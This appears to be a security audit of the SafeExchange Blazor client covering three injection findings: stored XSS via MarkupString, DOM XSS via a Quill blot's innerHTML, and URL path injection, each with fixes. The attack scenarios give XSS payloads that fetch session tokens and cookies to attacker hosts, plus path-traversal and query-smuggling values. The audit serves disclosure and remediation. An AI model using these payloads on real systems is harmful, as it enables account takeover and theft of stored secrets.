# A05:2025 — Injection

**Findings:** 3 · **Highest priority:** P0

---

## [P0] [CRITICAL] Stored XSS via `MarkupString` rendering of unsanitized rich-text secret content

- **Category:** A05:2025 — Injection (Stored Cross-Site Scripting)
- **CWE:** CWE-79, CWE-80
- **Files:**
  - `SafeExchange.Client.Web.Components/Pages/ViewData.razor:48` — sink: `@((MarkupString)this.compoundModel.MainData)`
  - `SafeExchange.Client.Web.Components/Pages/ViewData.razor:327` — taint entry: `this.compoundModel.MainData = compoundModelResult.Result.MainData;`
  - `SafeExchange.Client.Common/ApiClient/ApiClient.cs:79-126` — `GetCompoundModelAsync` concatenates chunks into `MainData` with no sanitization, no validation, no content-type check
  - `SafeExchange.Client.Web.Components/Classes/Helpers/Quill/RichTextEditor.cs:61-65` — `GetHtmlAsync` returns `quill.root.innerHTML` unmodified
  - `SafeExchange.Client.Web.Components/wwwroot/richTextEditor.js:201-204` — `getHtml` returns raw `quill.root.innerHTML`
  - `SafeExchange.Client.Web.Components/Classes/Helpers/Validation/CompoundModelValidator.cs:152-161` — only validates "non-empty" and "< 10 MB"; no HTML sanitization
  - Author side: `Pages/CreateData.razor:480`, `Pages/EditData.razor:740` write raw Quill HTML into `MainData`
- **Severity:** Critical · **Exploitability:** Easy · **Exposure:** Authenticated · **Confidence:** Confirmed · **Priority: P0**

**Taint trace:**

1. Author opens `CreateData.razor`. `GetHtmlAsync()` returns `quill.root.innerHTML`. Quill's editor DOM permits arbitrary HTML via drag-drop, paste, and — crucially — any client that speaks the API directly can submit any HTML string in the `MainData` field.
2. HTML is PUT to the backend and persisted. Client never sanitizes before `writer.WriteAsync(input.MainData)` (`ApiClient.cs:172`).
3. Viewer opens `ViewData.razor`. `FetchSecretAsync` loads chunks, assigns to `this.compoundModel.MainData`, Razor renders via `@((MarkupString)this.compoundModel.MainData)` — `MarkupString` is Blazor's explicit opt-out of HTML escaping. String injected as raw HTML.
4. `<img src=x onerror=...>`, `<svg onload=...>`, and event-handler attributes execute in the viewer's origin.

**Attack Scenario (step-by-step):**

1. Attacker has access to share a secret (core product feature).
2. Attacker creates a secret via direct API POST (bypassing Quill's paste sanitizer entirely) with body:

   ```html
   <img src=x onerror="fetch('https://attacker.example/x?t='+
     Object.keys(sessionStorage).map(k=>sessionStorage.getItem(k)).join('|'))">
   ```

3. Attacker grants Read access to the target user (or waits for an admin to open it during access-request triage).
4. Victim navigates to `viewdata/pwned`. `FetchSecretAsync` pulls the blob, binds to `compoundModel.MainData`, Razor re-renders `@((MarkupString)...)`. The `<img onerror=...>` fires in the victim's browser context.
5. Because the app is an MSAL-authenticated PWA with tokens in `sessionStorage` (MSAL WASM default — see A04-1), the payload exfiltrates the access token.
6. Attacker holds the victim's Entra ID bearer and calls the backend as the victim — **reading every secret the victim has access to, across the tenant**.
7. Lateral movement: plant a second payload in a secret the victim owns that is shared with higher-privilege users, pivoting to admin.

**Compound effect:** This is a **secrets-sharing application**. The payload fires inside a viewer who, by definition, is authorized to read sensitive secrets (passwords, API keys, tokens). Stored XSS in a password-manager-class product equals mass credential theft.

**Why usual defenses don't save you here:**

- Blazor WASM auto-escapes `@foo` by default, but `MarkupString` is the documented escape hatch.
- Quill's `clipboard.convert` sanitizer is a paste cleaner, not a security boundary — and attackers bypass it by calling the API directly.
- No CSP is set anywhere in the repo (see A02-2) — inline event handlers and exfiltration run freely.
- Server-side sanitization is not visible from this client repo and cannot be assumed; defense-in-depth demands client-side sanitization regardless.

**Recommendation (specific):**

1. **Do not use `MarkupString` for user-supplied content.** Pass through `Ganss.Xss.HtmlSanitizer` (NuGet) configured with an allowlist matching Quill's legitimate output (bold, italic, headings, lists, links with `rel="noopener noreferrer"`, and the custom `password`/`copyable` spans with `data-value` as plain-text attribute only).
2. Sanitize at **both** write-time (`CreateData.razor` / `EditData.razor` before `apiClient.CreateFromCompoundModelAsync`) **and** read-time (`ViewData.razor` before binding). Defense in depth.
3. Remove `innerSpan.innerHTML = value;` in `richTextEditor.js:62` — replace with `innerSpan.textContent = value;` (fixes finding A05-3 below).
4. Add a strict Content-Security-Policy (see A02-2).
5. Store the authentication token in memory rather than `sessionStorage` (use MSAL in-memory cache) to reduce XSS blast radius.

**Assumptions:** If the backend enforces HTML sanitization server-side with an allowlist sanitizer, severity drops to High/Medium. No evidence of such sanitization in this client-only repo; scoring reflects worst case. If a strict CSP is already set at the hosting layer, exfiltration via `fetch()` is blocked, dropping severity to High.

**Update (2026-05-23 — resolved server-side):** The backend *does* sanitize, unconditionally, on every main-content upload — `SafeExchange.Core/Functions/SafeExchangeSecretStream.cs` `UploadMainContentAsync` runs `Ganss.Xss.HtmlSanitizer` with the same allowlist the client used, and `IsMain` content can never take the unsanitized hashed-blob path. Since the API is reachable directly (a client-side sanitize is bypassable and therefore not a real boundary), the **redundant client-side** sanitization was removed: it re-parsed multi-MB inline-image HTML on the single Blazor WASM UI thread on every view (~14 s for large images; effectively hung iOS Safari). Stored-XSS is now enforced server-side at write time. Recommendations #3 (`richTextEditor.js` `innerHTML`), #4 (strict CSP), and #5 (token storage) remain **open** as defense-in-depth.

---

## [P1] [HIGH] DOM XSS in custom Quill `CopyableBlot` via `innerHTML = value`

- **Category:** A05:2025 — Injection (DOM-based Cross-Site Scripting)
- **CWE:** CWE-79, CWE-94
- **File:** `SafeExchange.Client.Web.Components/wwwroot/richTextEditor.js:44-76`
- **Severity:** High · **Exploitability:** Easy · **Exposure:** Authenticated · **Confidence:** High · **Priority: P1**

**Evidence:**

```javascript
const innerSpan = document.createElement("span");
innerSpan.innerHTML = value;   // line 62
```

`value` arrives from two paths:

1. **Live path:** the toolbar handler at line 119 calls `quill.getText(range)` and passes the selection text. Typing HTML markup and invoking the "copyable" button causes the markup to be re-interpreted as HTML by `innerHTML = value`. Self-XSS in the author's tab; becomes stored XSS when saved and loaded by another user.
2. **Reload path:** when a stored secret is loaded via `setHtml` (line 206-213), Quill parses the stored HTML; for every `<span class="ql-copyable-holder" data-value="...">`, Quill instantiates `CopyableBlot` from the stored attacker-controlled `data-value`. It flows into `innerHTML = value`.

**Relationship to P0:** This is a secondary sink on the same data path. P0 fires on the view page; P1 additionally fires on the edit page when a viewer clicks Edit.

**Attack Scenario:**

1. Attacker uploads a secret with body: `<span class="ql-copyable-holder" data-value="<img src=x onerror=fetch('https://atk/'+document.cookie)>"></span>`
2. Victim opens `editdata/<secretname>`. `EditData.razor:717` → `QuillEditor.SetHtmlAsync(this.compoundModel.MainData)` → `RichTextEditor.SetHtmlAsync` → `setHtml` JS → `quill.clipboard.convert({ html: htmlToSet })`. Quill instantiates `CopyableBlot.create(dataValueFromAttr)`. Line 62 runs `innerSpan.innerHTML = value` — payload fires in the editor's DOM.

**Recommendation:**

- Replace `innerSpan.innerHTML = value;` with `innerSpan.textContent = value;` at line 62. Copyable content is a visual token — never needs to render HTML.
- Apply the same hardening to `PasswordBlot` (line 22 uses a literal `" ******* "`, safe today — change to `textContent` on principle).
- In `CopyableBlot.value(node)` (line 75), after `getAttribute("data-value")`, validate that `value` is short plain text (no `<`, `>`, `&`, `"`, `'`).

**Assumption:** Quill 2.x registered blots preserve `data-*` attributes and the blot class as part of their format definition — they are not sanitized by Quill's default clipboard sanitizer.

---

## [P2] [MEDIUM] URL path injection — un-encoded user-controlled identifiers in `ApiClient`

- **Category:** A05:2025 — Injection (URL/HTTP request path injection)
- **CWE:** CWE-74, CWE-88, CWE-116, CWE-20
- **Files:**
  - `SafeExchange.Client.Common/ApiClient/ApiClient.cs:135-437` — every method interpolates `secretId`, `contentId`, `chunkId`, `pinnedGroupId` raw:
    - Line 137: `new Uri(client.BaseAddress, $"{ApiVersion}/secret/{secretId}/content/{contentId}/all")`
    - Line 143: `client.GetAsync($"{ApiVersion}/secret/{secretId}/content/{contentId}/all", ...)`
    - Line 281: `client.PostAsJsonAsync($"{ApiVersion}/accessrequest/{secretId}", input)`
    - Lines 317, 344, 350, 356, 366, 376, 382, 392, 398, 409, 436, 493, 499, 505 — same pattern
  - Taint source: route parameter `ObjectName` in `ViewData.razor:176` / `EditData.razor`; also `Index.razor:75 NavigateTo($"viewdata/{searchInput.SearchString}")`
- **Severity:** Medium · **Exploitability:** Moderate · **Exposure:** Authenticated · **Confidence:** High · **Priority: P2**

**Description:** Path parameters are interpolated raw into URL templates with no `Uri.EscapeDataString`. Characters like `/`, `?`, `#`, `..` smuggle across path-segment boundaries:

- `secretId = "../../v2/secret/admin-secret"` → `System.Uri` normalizes to `v2/secret/admin-secret/content/main/all`.
- `secretId = "foo/drop"` → hits an unintended endpoint.
- `secretId = "foo?bypass=1"` → injects a query parameter the server may honor.

**Why this is A05 and not A01:** The root cause is missing output encoding at the sink. The access-control side (server-side authorization) is the compensating control; the client-side bug is injection into an interpreter.

**Attack Scenario:**

1. Attacker creates a secret with a name like `weirdname/../secret2` or feeds it into `Index.razor:75` via the search box.
2. `GetSecretMetadataAsync("weirdname/../secret2")` normalizes to `v2/secret/secret2`. Client-side logic still believes it's acting on `weirdname/../secret2`; client-side checks become meaningless.
3. In `ViewData.razor:348` — `$"addrequest?subject={this.ObjectName}&permission={permissions}"` — `ObjectName` containing `&` injects extra query parameters into the access-request create flow.

**Recommendation:**

1. Introduce `EncodePathSegment(string s) => Uri.EscapeDataString(s)` and use it for every interpolated identifier:

   ```csharp
   client.GetAsync($"{ApiVersion}/secret/{Uri.EscapeDataString(secretId)}/content/{Uri.EscapeDataString(contentId)}/chunk/{Uri.EscapeDataString(chunkId)}")
   ```

2. Validate secret names at write-time against `^[a-zA-Z0-9._-]{1,128}$` in `CompoundModelValidator`.
3. In `ViewData.razor:348`, `Index.razor:75`, `ListData.razor:81/91`, and `EditData.razor`, use `Uri.EscapeDataString` on `ObjectName` / `SearchString` before interpolation.

**Assumption:** If the backend restricts `secretId` to `^[a-zA-Z0-9._-]+$` at the model binding layer, severity drops to Low (still worth fixing for defense in depth).
